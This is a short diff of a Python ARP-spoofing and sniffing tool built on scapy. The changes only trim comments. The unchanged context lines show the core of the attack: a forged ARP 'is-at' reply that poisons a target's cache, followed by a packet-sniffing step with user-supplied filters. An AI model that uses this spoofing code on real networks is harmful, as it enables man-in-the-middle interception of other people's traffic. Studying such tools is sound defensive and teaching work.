@@ -160,7 +160,7 @@ def restore(target_ip, host_ip, verbose=True):
 def spoof_delay(target_ip, host_ip, verbose=True):
     # get the mac address of the target
     target_mac = get_mac(target_ip)
-    # craft the arp 'is-at' operation packet, in other words; an ARP response
+    # ARP response
     arp_response = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
     # send the packet
     verbose=0
@@ -234,7 +234,6 @@ def main():
 
     print("Getting List\n")
     # Sniffing part
-    # parameters: Filter for type of connection, Filter for expected address
     ProtocolFilter = input("If you wish to filter protocols, type what should be searched for\n")
     SniffList = GetList(ProtocolFilter)
     AddressFilter = input("If you wish to filter Addresses, type what should be searched for\n")
